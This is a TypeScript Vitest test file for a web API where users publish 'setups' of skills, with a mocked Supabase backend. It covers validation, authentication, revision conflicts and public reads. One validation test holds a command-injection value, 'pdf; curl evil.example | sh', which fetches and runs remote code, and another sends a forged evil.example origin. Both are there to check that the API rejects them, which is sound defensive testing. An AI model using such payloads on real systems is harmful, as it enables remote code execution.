import { beforeEach, describe, expect, it, vi } from "vitest";
vi.mock("server-only", () => ({}));
vi.mock("next/headers", () => ({ cookies: async () => ({ getAll: () => [], set: () => {} }) }));
// A recording stand-in for the Supabase query builder: every call chains, awaiting resolves.
const db = vi.hoisted(() => ({
  user: null as null | { id: string; is_anonymous: boolean },
  results: {} as Record<string, { data: unknown; error: null | { code: string } }>,
  calls: [] as { table: string; method: string; args: unknown[] }[],
}));
const client = vi.hoisted(() => () => ({
  auth: { getUser: async () => ({ data: { user: db.user } }) },
  from(table: string) {
    let write = "select";
    const chain: Record<string, unknown> = new Proxy({}, {
      get: (_target, method: string) =>
        method === "then"
          ? (resolve: (value: unknown) => void) => resolve(db.results[`${table}.${write}`] ?? { data: null, error: null })
          : (...args: unknown[]) => {
              if (["insert", "update", "delete"].includes(method)) write = method;
              db.calls.push({ table, method, args });
              return chain;
            },
    });
    return chain;
  },
}));
vi.mock("@supabase/ssr", () => ({ createServerClient: client }));
vi.mock("@supabase/supabase-js", () => ({ createClient: client }));
import { GET, POST } from "./route";
import { DELETE, PATCH } from "./[id]/route";
import { GET as me } from "../me/route";

const id = "aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa";
const setup = {
  title: "Daily driver",
  slug: "daily-driver",
  description: "",
  items: [{ kind: "skill", repository: "anthropics/skills", skill: "pdf", note: "" }],
  published: true,
};
const send = (method: string, body?: unknown, origin = "http://localhost") =>
  new Request(`http://localhost/api/setups`, { method, headers: { origin }, body: body === undefined ? undefined : JSON.stringify(body) });
const context = { params: Promise.resolve({ id }) };
const profile = { handle: "eliancoder", display_name: "Ian", avatar_url: null };
beforeEach(() => {
  vi.stubEnv("SUPABASE_URL", "https://project.supabase.test");
  vi.stubEnv("SUPABASE_ANON_KEY", "anon");
  db.user = { id: "11111111-1111-4111-8111-111111111111", is_anonymous: false };
  db.results = { "profiles.select": { data: profile, error: null } };
  db.calls = [];
});
describe("setups API", () => {
  it("says profiles are unavailable when cloud storage is not configured", async () => {
    vi.stubEnv("SUPABASE_URL", "");
    expect((await GET(send("GET"))).status).toBe(503);
    expect((await POST(send("POST", setup))).status).toBe(503);
    expect(await (await me()).json()).toEqual({ configured: false, profile: null, setups: [] });
  });
  it("rejects unsafe or malformed setups before touching storage", async () => {
    for (const body of [
      { ...setup, items: [{ ...setup.items[0], skill: "pdf; curl evil.example | sh" }] },
      { ...setup, items: [] },
      { ...setup, user_id: "22222222-2222-4222-8222-222222222222" },
      { ...setup, slug: "Not A Slug" },
    ])
      expect((await POST(send("POST", body))).status).toBe(400);
    expect(db.calls).toEqual([]);
    expect((await POST(send("POST", setup, "https://evil.example"))).status).toBe(403);
  });
  it("requires a GitHub account with a profile; anonymous builder sessions cannot publish", async () => {
    db.user = { ...db.user!, is_anonymous: true };
    expect((await POST(send("POST", setup))).status).toBe(401);
    db.user = null;
    expect((await PATCH(send("PATCH", { setup, revision: 1 }), context)).status).toBe(401);
    expect((await DELETE(send("DELETE"), context)).status).toBe(401);
    expect(await (await me()).json()).toEqual({ configured: true, profile: null, setups: [] });
    db.user = { id: "11111111-1111-4111-8111-111111111111", is_anonymous: false };
    db.results = { "profiles.select": { data: null, error: null } };
    expect((await POST(send("POST", setup))).status).toBe(401);
    expect(db.calls.some((call) => call.method === "insert")).toBe(false);
  });
  it("creates a setup without accepting an owner from the request", async () => {
    db.results["setups.insert"] = { data: { id, ...setup, revision: 1 }, error: null };
    const response = await POST(send("POST", setup));
    expect(response.status).toBe(201);
    expect(db.calls.find((call) => call.method === "insert")?.args).toEqual([setup]);
  });
  it("turns duplicate names and stale revisions into conflicts instead of overwriting", async () => {
    db.results["setups.insert"] = { data: null, error: { code: "23505" } };
    expect((await POST(send("POST", setup))).status).toBe(409);
    // No row matched the expected revision.
    db.results["setups.update"] = { data: null, error: null };
    expect((await PATCH(send("PATCH", { setup, revision: 3 }), context)).status).toBe(409);
    expect(db.calls.find((call) => call.method === "update")?.args).toEqual([{ ...setup, revision: 4 }]);
    expect(db.calls).toContainEqual({ table: "setups", method: "eq", args: ["revision", 3] });
    db.results["setups.update"] = { data: { id, ...setup, revision: 4 }, error: null };
    expect((await PATCH(send("PATCH", { setup, revision: 3 }), context)).status).toBe(200);
    expect((await PATCH(send("PATCH", { setup, revision: 0 }), context)).status).toBe(400);
  });
  it("reads public pages without a session and only asks for published rows", async () => {
    db.user = null;
    db.results["setups.select"] = { data: [], error: null };
    expect(await (await GET(send("GET"))).json()).toEqual({ setups: [] });
    expect(db.calls).toContainEqual({ table: "setups", method: "eq", args: ["published", true] });
    db.results["setups.select"] = { data: null, error: null };
    const missing = await GET(new Request("http://localhost/api/setups?handle=ElianCoder&slug=nope"));
    expect(missing.status).toBe(404);
    expect(db.calls).toContainEqual({ table: "profiles", method: "eq", args: ["handle", "eliancoder"] });
    expect((await GET(new Request("http://localhost/api/setups?handle=bad%20handle"))).status).toBe(400);
  });
});
